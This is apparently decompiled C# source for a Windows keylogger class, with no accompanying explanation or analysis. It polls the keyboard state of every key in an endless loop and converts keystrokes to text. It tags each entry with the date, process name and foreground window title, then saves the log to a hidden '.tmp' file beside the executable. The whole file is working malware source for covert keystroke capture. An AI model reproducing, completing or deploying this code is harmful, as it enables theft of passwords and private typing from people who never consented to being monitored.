using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns1;

public class GClass1
{
	private int int_0;

	private string string_0;

	private Keys keys_0;

	public Clock clock_0;

	public string string_1;

	private object object_0;

	public string string_2;

	public GClass1()
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		keys_0 = (Keys)0;
		clock_0 = new Clock();
		string_1 = "";
		object_0 = (object)new Keyboard();
		string_2 = Assembly.GetExecutingAssembly().Location + ".tmp";
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_1);

	private string method_0()
	{
		try
		{
			IntPtr foregroundWindow;
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow = GetForegroundWindow(), ref int_);
			object processById = Process.GetProcessById(int_);
			if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == int_0), Operators.CompareObjectEqual((object)string_0, NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				int_0 = foregroundWindow.ToInt32();
				string_0 = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
				return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("\r\n\u0001" + method_1(), " "), NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" "), (object)string_0), (object)'\u0001'), (object)"\r\n"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string method_1()
	{
		try
		{
			return clock_0.get_LocalTime().ToString("yy/MM/dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "??/??/??";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_0(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_;
			object result;
			if (!GetKeyboardState(byte_ = new byte[255]))
			{
				result = "";
			}
			else
			{
				uint uint_ = MapVirtualKey(uint_0, 0u);
				IntPtr foregroundWindow = GetForegroundWindow();
				int int_ = 0;
				IntPtr intptr_ = (IntPtr)GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, ref int_));
				ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
				result = stringBuilder.ToString();
			}
			return (string)result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	private string method_2(Keys keys_1)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Invalid comparison between Unknown and I4
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Invalid comparison between Unknown and I4
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Invalid comparison between Unknown and I4
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Invalid comparison between Unknown and I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Invalid comparison between Unknown and I4
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Invalid comparison between Unknown and I4
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Invalid comparison between Unknown and I4
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Invalid comparison between Unknown and I4
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Invalid comparison between Unknown and I4
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Invalid comparison between Unknown and I4
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Invalid comparison between Unknown and I4
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Invalid comparison between Unknown and I4
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Invalid comparison between Unknown and I4
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Invalid comparison between Unknown and I4
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Invalid comparison between Unknown and I4
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Invalid comparison between Unknown and I4
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Invalid comparison between Unknown and I4
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Invalid comparison between Unknown and I4
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Invalid comparison between Unknown and I4
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Invalid comparison between Unknown and I4
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Invalid comparison between Unknown and I4
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Invalid comparison between Unknown and I4
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_0133: Invalid comparison between Unknown and I4
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected I4, but got Unknown
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Expected I4, but got Unknown
		bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(object_0, (Type)null, "ShiftKeyDown", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(object_0, (Type)null, "CapsLock", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			Keys val;
			object result;
			if ((int)(val = keys_1) != 112 && (int)val != 113 && (int)val != 114 && (int)val != 115 && (int)val != 116 && (int)val != 117 && (int)val != 118 && (int)val != 119 && (int)val != 120 && (int)val != 121 && (int)val != 122 && (int)val != 123 && (int)val != 35 && (int)val != 46 && (int)val != 8)
			{
				if ((int)val == 160 || (int)val == 161 || (int)val == 65536 || (int)val == 16 || (int)val == 131072 || (int)val == 17 || (int)val == 163 || (int)val == 162 || (int)val == 262144)
				{
					goto IL_016f;
				}
				if ((int)val == 32)
				{
					result = " ";
				}
				else if ((int)val != 13 && (int)val != 13)
				{
					result = (((int)val == 9) ? "[TAP]\r\n" : checked((!flag) ? smethod_0((uint)keys_1) : smethod_0((uint)keys_1).ToUpper()));
				}
				else
				{
					if (string_1.EndsWith("[ENTER]\r\n"))
					{
						goto IL_016f;
					}
					result = "[ENTER]\r\n";
				}
			}
			else
			{
				result = "[" + ((Enum)keys_1).ToString() + "]";
			}
			goto IL_0190;
			IL_016f:
			result = "";
			goto IL_0190;
			IL_0190:
			return (string)result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = ((!flag) ? Strings.ChrW((int)keys_1).ToString().ToLower() : Strings.ChrW((int)keys_1).ToString().ToUpper());
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	public void method_3()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string_1 = File.ReadAllText(string_2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys keys_ = (Keys)num2;
							string text = method_2(keys_);
							if (text.Length > 0)
							{
								string_1 += method_0();
								string_1 += text;
							}
							keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						num2 = 20480;
						if (string_1.Length > 20480)
						{
							string_1 = string_1.Remove(0, string_1.Length - num2);
						}
						File.WriteAllText(string_2, string_1);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
